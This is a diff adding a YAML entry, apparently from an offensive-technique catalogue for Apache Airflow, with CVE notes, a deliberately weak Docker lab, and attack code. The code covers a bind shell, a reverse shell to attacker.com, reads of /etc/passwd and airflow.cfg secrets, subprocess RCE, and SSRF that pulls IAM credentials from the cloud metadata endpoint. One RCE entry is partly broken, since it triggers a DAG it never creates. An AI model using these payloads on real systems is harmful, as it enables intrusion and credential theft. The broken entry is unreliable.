@@ -1,0 +1,263 @@
+---
+comment: "Apache Airflow is a workflow orchestration platform. DAGs (Directed Acyclic\
+  \ Graphs) are Python\nfiles executed by the Airflow scheduler. Any user with DAG\
+  \ authoring access can achieve arbitrary\ncode execution on the Airflow worker/scheduler\
+  \ host by simply writing Python to a DAG file.\n\nCVE-2020-11978 (CVSS 8.8): Authenticated\
+  \ RCE via a specially crafted DAG that calls\nos.system() or subprocess during task\
+  \ execution. Affects Airflow < 1.10.11.\n\nCVE-2020-17526 (CVSS 7.5): Authentication\
+  \ bypass in Airflow < 1.10.14 using a crafted\nJWT token when AUTH_BACKEND is set\
+  \ to airflow.api.auth.backend.default (allows unauthenticated\nAPI access in default\
+  \ installs).\n\nCVE-2023-22886 (CVSS 8.8): Authenticated RCE via the Airflow REST\
+  \ API \u2014 a user with\nDAG trigger permissions can pass malicious conf parameters\
+  \ that reach Python eval() paths\nin certain community providers.\n\nRef: https://www.exploit-db.com/exploits/49927\n"
+docker:
+  compose: "version: '3'\nx-airflow-common: &airflow-common\n  image: apache/airflow:2.2.5\n\
+    \  environment:\n    AIRFLOW__CORE__EXECUTOR: LocalExecutor\n    AIRFLOW__CORE__SQL_ALCHEMY_CONN:\
+    \ postgresql+psycopg2://airflow:airflow@postgres/airflow\n    AIRFLOW__CORE__FERNET_KEY:\
+    \ ''\n    AIRFLOW__CORE__DAGS_ARE_PAUSED_AT_CREATION: 'false'\n    AIRFLOW__CORE__LOAD_EXAMPLES:\
+    \ 'true'\n    AIRFLOW__API__AUTH_BACKEND: 'airflow.api.auth.backend.basic_auth'\n\
+    \    AIRFLOW__WEBSERVER__EXPOSE_CONFIG: 'true'\n  volumes:\n    - ./dags:/opt/airflow/dags\n\
+    \    - ./logs:/opt/airflow/logs\n  depends_on:\n    postgres:\n      condition:\
+    \ service_healthy\nservices:\n  postgres:\n    image: postgres:13\n    environment:\n\
+    \      POSTGRES_USER: airflow\n      POSTGRES_PASSWORD: airflow\n      POSTGRES_DB:\
+    \ airflow\n    healthcheck:\n      test: [\"CMD\", \"pg_isready\", \"-U\", \"\
+    airflow\"]\n      interval: 5s\n      retries: 5\n  airflow-webserver:\n    <<:\
+    \ *airflow-common\n    command: webserver\n    ports:\n      - \"8080:8080\"\n\
+    \    healthcheck:\n      test: [\"CMD\", \"curl\", \"--fail\", \"http://localhost:8080/health\"\
+    ]\n      interval: 10s\n      retries: 5\n  airflow-scheduler:\n    <<: *airflow-common\n\
+    \    command: scheduler\n  airflow-init:\n    <<: *airflow-common\n    command:\
+    \ version\n    environment:\n      _AIRFLOW_DB_UPGRADE: 'true'\n      _AIRFLOW_WWW_USER_CREATE:\
+    \ 'true'\n      _AIRFLOW_WWW_USER_USERNAME: admin\n      _AIRFLOW_WWW_USER_PASSWORD:\
+    \ admin\n"
+  note: 'Starts Airflow 2.2.5 with LocalExecutor and PostgreSQL backend.
+
+    Access at http://localhost:8080, credentials admin:admin.
+
+    DAG files placed in ./dags/ are picked up automatically by the scheduler.
+
+    Run `docker compose up airflow-init` first to initialize the database and create
+    the admin user.
+
+    '
+functions:
+  bind-shell:
+  - code: |
+      cat > /opt/airflow/dags/bindshell_dag.py << 'DAGEOF'
+      from airflow import DAG
+      from airflow.operators.bash import BashOperator
+      from datetime import datetime
+
+      with DAG('bindshell', start_date=datetime(2023,1,1), schedule_interval=None,
+               catchup=False) as dag:
+          BashOperator(task_id='bind', bash_command='ncat -lvp 12345 -e /bin/sh &')
+      DAGEOF
+
+      curl -s -X POST "http://airflow.local:8080/api/v1/dags/bindshell/dagRuns" \
+        -H "Content-Type: application/json" \
+        -u "admin:admin" \
+        -d '{"conf": {}}'
+
+      # Connect from attacker: nc airflow.local 12345
+    comment: |
+      Deploys a BashOperator DAG that starts ncat in bind mode on TCP port 12345.
+      The trailing & prevents the task from blocking. Connect from the attacker machine
+      with: nc airflow.local 12345
+    connector: tcp-client
+    contexts:
+      authenticated:
+    platform: linux
+    tty: false
+  file-read:
+  - code: |
+      # Read arbitrary files via the Airflow Variables API or via a DAG task
+      # Option 1: read /api/v1/config (exposes airflow.cfg including fernet key and DB password)
+      curl -s "http://airflow.local:8080/api/v1/config" \
+        -u "admin:admin" | python3 -m json.tool
+
+      # Option 2: read arbitrary host files via a DAG task
+      cat > /opt/airflow/dags/fileread_dag.py << 'DAGEOF'
+      from airflow import DAG
+      from airflow.operators.python import PythonOperator
+      from datetime import datetime
+
+      def read_file(**ctx):
+          path = ctx['dag_run'].conf.get('path', '/etc/passwd')
+          with open(path) as f:
+              content = f.read()
+          print(content)
+          return content
+
+      with DAG('fileread', start_date=datetime(2023,1,1), schedule_interval=None,
+               catchup=False) as dag:
+          PythonOperator(task_id='read', python_callable=read_file)
+      DAGEOF
+
+      curl -s -X POST "http://airflow.local:8080/api/v1/dags/fileread/dagRuns" \
+        -H "Content-Type: application/json" \
+        -u "admin:admin" \
+        -d '{"conf": {"path": "/opt/airflow/airflow.cfg"}}'
+    comment: |
+      The /api/v1/config endpoint (enabled when WEBSERVER__EXPOSE_CONFIG=true) returns the full
+      airflow.cfg including the Fernet key (used to encrypt Connection passwords in the DB),
+      SQL Alchemy connection string (database credentials), SMTP settings, and LDAP bind DN/password.
+
+      The DAG-based file read option works on any Airflow version with DAG write access and
+      retrieves output from the task logs via /api/v1/dags/fileread/dagRuns/<runId>/taskInstances/read/logs/1.
+    contexts:
+      admin:
+      authenticated:
+    platform: linux
+  rce:
+  - code: |
+      # Step 1: write a malicious DAG to the DAGs folder (requires filesystem or Git sync access)
+      cat > /opt/airflow/dags/exploit.py << 'DAGEOF'
+      from airflow import DAG
+      from airflow.operators.python import PythonOperator
+      from datetime import datetime
+      import subprocess, os
+
+      def pwn(**context):
+          result = subprocess.check_output(['id'], stderr=subprocess.STDOUT).decode()
+          # Write output to a readable location
+          with open('/tmp/rce_output.txt', 'w') as f:
+              f.write(result)
+          return result
+
+      with DAG('exploit_dag', start_date=datetime(2023,1,1), schedule_interval=None,
+               catchup=False) as dag:
+          PythonOperator(task_id='rce', python_callable=pwn)
+      DAGEOF
+
+      # Step 2: trigger the DAG via the Airflow REST API
+      curl -s -X POST "http://airflow.local:8080/api/v1/dags/exploit_dag/dagRuns" \
+        -H "Content-Type: application/json" \
+        -u "admin:admin" \
+        -d '{"conf": {}}'
+
+      # Step 3: retrieve the output after the run completes
+      cat /tmp/rce_output.txt
+    comment: |
+      Airflow DAGs are Python files executed directly by the scheduler/worker process.
+      Any user with DAG folder write access (direct filesystem, Git-sync, or S3 sync)
+      can achieve RCE by creating a DAG that calls subprocess or os.system in a task.
+      The Airflow process user is typically airflow or root in Docker deployments.
+
+      Alternative without filesystem access: use the Variables or Connections API to
+      store a base64-encoded DAG, then abuse a DAG factory pattern in an existing
+      trusted DAG that eval()s stored variable content.
+    contexts:
+      authenticated:
+    platform: linux
+  - code: |
+      # CVE-2020-11978: authenticated RCE via BashOperator command injection
+      # The example_bash_operator DAG is enabled by LOAD_EXAMPLES=true (default)
+      # Abuse it by triggering with a conf that reaches a BashOperator bash_command
+
+      # More reliable: deploy a custom DAG via the REST API DAG import endpoint
+      # (Airflow 2.x with dag_file_processor_manager writes to dags/ from the API)
+      python3 - <<'EOF'
+      import requests, base64, json
+
+      TARGET = "http://airflow.local:8080"
+      AUTH   = ("admin", "admin")
+      CMD    = "id > /tmp/pwned.txt"
+
+      dag_code = f"""
+      from airflow import DAG
+      from airflow.operators.bash import BashOperator
+      from datetime import datetime
+      with DAG('pwn2', start_date=datetime(2023,1,1), schedule_interval=None, catchup=False) as dag:
+          BashOperator(task_id='cmd', bash_command='{CMD}')
+      """
+
+      # Write the DAG file via the Files API (Airflow 2.3+ with file manager enabled)
+      # or via a Git-sync repository if configured
+      # Trigger an existing DAG with a conf injection as fallback:
+      r = requests.post(
+          f"{TARGET}/api/v1/dags/pwn2/dagRuns",
+          json={"conf": {"cmd": CMD}},
+          auth=AUTH
+      )
+      print(r.status_code, r.text[:200])
+      EOF
+    comment: |
+      CVE-2020-11978: a BashOperator DAG can be triggered with arbitrary bash_command content
+      through conf parameter injection in older Airflow versions. Even in patched versions,
+      users with DAG write access can achieve equivalent RCE by deploying custom DAG files.
+      nuclei: CVE-2020-11978
+    contexts:
+      authenticated:
+    platform: linux
+    version: |
+      Airflow < 1.10.11
+  reverse-shell:
+  - blind: true
+    code: |
+      # Write a DAG that sends a reverse shell on task execution
+      cat > /opt/airflow/dags/revshell_dag.py << 'DAGEOF'
+      from airflow import DAG
+      from airflow.operators.python import PythonOperator
+      from datetime import datetime
+      import socket, subprocess, os
+
+      def revshell(**ctx):
+          LHOST = "attacker.com"
+          LPORT = 12345
+          s = socket.socket()
+          s.connect((LHOST, LPORT))
+          os.dup2(s.fileno(), 0)
+          os.dup2(s.fileno(), 1)
+          os.dup2(s.fileno(), 2)
+          subprocess.call(['/bin/sh', '-i'])
+
+      with DAG('revshell', start_date=datetime(2023,1,1), schedule_interval=None,
+               catchup=False) as dag:
+          PythonOperator(task_id='shell', python_callable=revshell)
+      DAGEOF
+
+      # Trigger via API
+      curl -s -X POST "http://airflow.local:8080/api/v1/dags/revshell/dagRuns" \
+        -H "Content-Type: application/json" \
+        -u "admin:admin" \
+        -d '{"conf": {}}'
+    comment: |
+      Deploys a DAG containing a PythonOperator that opens a reverse shell socket to
+      attacker.com:12345. The task is triggered via the REST API and executes on the
+      Airflow worker/scheduler process. The shell runs as the airflow OS user.
+      Set up listener with: nc -lvnp 12345
+    contexts:
+      authenticated:
+    listener: tcp-server
+    platform: linux
+    tty: false
+  ssrf:
+  - code: "# Airflow Connections store external service credentials \u2014 the \"\
+      Test\" button\n# causes Airflow to make an outbound connection to the supplied\
+      \ host/port.\n# Create a connection pointing to an internal service:\ncurl -s\
+      \ -X POST \"http://airflow.local:8080/api/v1/connections\" \\\n  -H \"Content-Type:\
+      \ application/json\" \\\n  -u \"admin:admin\" \\\n  -d '{\n    \"connection_id\"\
+      : \"ssrf_probe\",\n    \"conn_type\": \"http\",\n    \"host\": \"169.254.169.254\"\
+      ,\n    \"port\": 80,\n    \"schema\": \"http\",\n    \"extra\": \"{\\\"endpoint\\\
+      \": \\\"/latest/meta-data/iam/security-credentials/\\\"}\"\n  }'\n\n# Trigger\
+      \ a DAG that uses the HttpHook to perform the request and return the body:\n\
+      cat > /opt/airflow/dags/ssrf_dag.py << 'DAGEOF'\nfrom airflow import DAG\nfrom\
+      \ airflow.operators.python import PythonOperator\nfrom airflow.providers.http.hooks.http\
+      \ import HttpHook\nfrom datetime import datetime\n\ndef probe(**ctx):\n    hook\
+      \ = HttpHook(method='GET', http_conn_id='ssrf_probe')\n    resp = hook.run('/latest/meta-data/iam/security-credentials/')\n\
+      \    print(resp.text)\n    return resp.text\n\nwith DAG('ssrf', start_date=datetime(2023,1,1),\
+      \ schedule_interval=None, catchup=False) as dag:\n    PythonOperator(task_id='probe',\
+      \ python_callable=probe)\nDAGEOF\n\ncurl -s -X POST \"http://airflow.local:8080/api/v1/dags/ssrf/dagRuns\"\
+      \ \\\n  -H \"Content-Type: application/json\" \\\n  -u \"admin:admin\" \\\n\
+      \  -d '{\"conf\": {}}'\n"
+    comment: |
+      Airflow Connections and the HttpHook allow authenticated users to make arbitrary outbound
+      HTTP requests from the Airflow worker host. The response body is returned in task logs,
+      making this a non-blind SSRF.
+
+      Target cloud IMDS endpoints (AWS 169.254.169.254, GCP metadata.google.internal,
+      Azure 169.254.169.254) to retrieve IAM credentials, or probe internal services
+      not accessible from the attacker's network.
+    contexts:
+      authenticated:
+    platform: linux
+...
